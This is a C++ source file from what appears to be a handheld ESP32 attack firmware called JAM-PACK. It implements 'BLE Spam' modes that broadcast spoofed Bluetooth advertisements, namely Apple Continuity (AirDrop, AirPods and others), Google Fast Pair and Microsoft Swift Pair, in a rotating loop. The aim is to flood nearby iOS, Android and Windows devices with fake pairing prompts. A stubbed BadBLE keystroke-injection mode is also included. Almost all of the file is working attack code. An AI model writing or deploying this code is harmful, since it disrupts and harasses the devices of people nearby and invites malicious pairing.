// ╔══════════════════════════════════════════╗
// ║    JAM-PACK · bt_module.cpp             ║
// ║    BLE Spam - iOS / Android / Win       ║
// ╚══════════════════════════════════════════╝

#include "bt_module.h"
#include "display.h"
#include "input.h"

#include <BLEDevice.h>
#include <BLEAdvertising.h>

static const char* items[] = {
  "BLE Spam iOS", "BLE Spam Android", "BLE Spam Win", "BadBLE"
};
static const int COUNT = 4;

const char** bt_items() { return items; }
int          bt_count() { return COUNT; }

static BLEAdvertising* pAdv     = nullptr;
static bool            bleInit  = false;
static uint32_t        packetCount = 0;

static void ble_init() {
  if (!bleInit) {
    BLEDevice::init("JAM-PACK");
    bleInit = true;
  }
  pAdv = BLEDevice::getAdvertising();
  packetCount = 0;
}

static void ble_stop() {
  if (pAdv) pAdv->stop();
}

// ══════════════════════════════════════════
//  iOS — Apple Continuity (AirDrop / AirPods / etc.)
// ══════════════════════════════════════════
static void spam_ios(uint32_t startTime) {
  static const uint8_t payloads[][8] = {
    { 0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x02, 0x00, 0x00 }, // AirDrop
    { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02 }, // AirPods Pro
    { 0x1E, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01 }, // Apple TV
    { 0x1E, 0xFF, 0x4C, 0x00, 0x10, 0x05, 0x0B, 0x18 }, // Apple Watch
  };
  static uint8_t idx = 0;

  BLEAdvertisementData data;
  std::string payload((char*)payloads[idx], 8);
  data.addData(payload);
  pAdv->setAdvertisementData(data);
  pAdv->start();
  delay(50);
  pAdv->stop();
  idx = (idx + 1) % 4;
  packetCount++;

  u8g2.clearBuffer();
  display_header("BLE Spam iOS");
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(2, 24, "Apple Continuity");
  char buf[24];
  snprintf(buf, sizeof(buf), "Packets: %lu", packetCount);
  u8g2.drawStr(2, 36, buf);
  snprintf(buf, sizeof(buf), "t: %lus", (millis() - startTime) / 1000UL);
  u8g2.drawStr(2, 48, buf);
  display_statusbar("BACK STOP", "");
  u8g2.sendBuffer();
}

// ══════════════════════════════════════════
//  Android — Google Fast Pair (0xFE2C)
// ══════════════════════════════════════════
static void spam_android(uint32_t startTime) {
  static const uint8_t models[][3] = {
    { 0x00, 0xF0, 0x36 },
    { 0x00, 0x45, 0xD6 },
    { 0x00, 0x20, 0x19 },
    { 0x00, 0xAA, 0xBB },
  };
  static uint8_t idx = 0;

  BLEAdvertisementData data;
  std::string svcData;
  svcData += (char)0x04;
  svcData += (char)0x16;
  svcData += (char)0x2C;
  svcData += (char)0xFE;
  svcData += (char)models[idx][0];
  svcData += (char)models[idx][1];
  svcData += (char)models[idx][2];
  data.addData(svcData);
  pAdv->setAdvertisementData(data);
  pAdv->start();
  delay(50);
  pAdv->stop();
  idx = (idx + 1) % 4;
  packetCount++;

  u8g2.clearBuffer();
  display_header("BLE Spam Android");
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(2, 24, "Fast Pair packets");
  char buf[24];
  snprintf(buf, sizeof(buf), "Packets: %lu", packetCount);
  u8g2.drawStr(2, 36, buf);
  snprintf(buf, sizeof(buf), "t: %lus", (millis() - startTime) / 1000UL);
  u8g2.drawStr(2, 48, buf);
  display_statusbar("BACK STOP", "");
  u8g2.sendBuffer();
}

// ══════════════════════════════════════════
//  Windows — Microsoft Swift Pair (0x0006)
// ══════════════════════════════════════════
static void spam_windows(uint32_t startTime) {
  static const uint8_t scenarios[][4] = {
    { 0x03, 0x00, 0x80, 0x00 },
    { 0x03, 0x00, 0x08, 0x00 },
    { 0x03, 0x00, 0x40, 0x00 },
  };
  static uint8_t idx = 0;

  BLEAdvertisementData data;
  std::string mfr;
  mfr += (char)0x06;
  mfr += (char)0x00;
  mfr += (char)scenarios[idx][0];
  mfr += (char)scenarios[idx][1];
  mfr += (char)scenarios[idx][2];
  mfr += (char)scenarios[idx][3];
  data.setManufacturerData(mfr);
  pAdv->setAdvertisementData(data);
  pAdv->start();
  delay(50);
  pAdv->stop();
  idx = (idx + 1) % 3;
  packetCount++;

  u8g2.clearBuffer();
  display_header("BLE Spam Win");
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(2, 24, "Swift Pair packets");
  char buf[24];
  snprintf(buf, sizeof(buf), "Packets: %lu", packetCount);
  u8g2.drawStr(2, 36, buf);
  snprintf(buf, sizeof(buf), "t: %lus", (millis() - startTime) / 1000UL);
  u8g2.drawStr(2, 48, buf);
  display_statusbar("BACK STOP", "");
  u8g2.sendBuffer();
}

// ══════════════════════════════════════════
//  BadBLE — заглушка (нужен payload на SD)
// ══════════════════════════════════════════
static void bad_ble(uint32_t startTime) {
  u8g2.clearBuffer();
  display_header("BadBLE");
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(2, 24, "Load payload.ble");
  u8g2.drawStr(2, 34, "from SD card");
  u8g2.drawStr(2, 44, "[TODO]");
  display_statusbar("BACK", "");
  u8g2.sendBuffer();
}

// ══════════════════════════════════════════
//  Вызов из menu.cpp
// ══════════════════════════════════════════
void bt_run(int idx, uint32_t startTime) {
  static int lastIdx = -1;
  if (lastIdx != idx) {
    ble_stop();
    ble_init();
    lastIdx = idx;
  }
  switch (idx) {
    case 0: spam_ios(startTime);     break;
    case 1: spam_android(startTime); break;
    case 2: spam_windows(startTime); break;
    case 3: bad_ble(startTime);      break;
  }
}
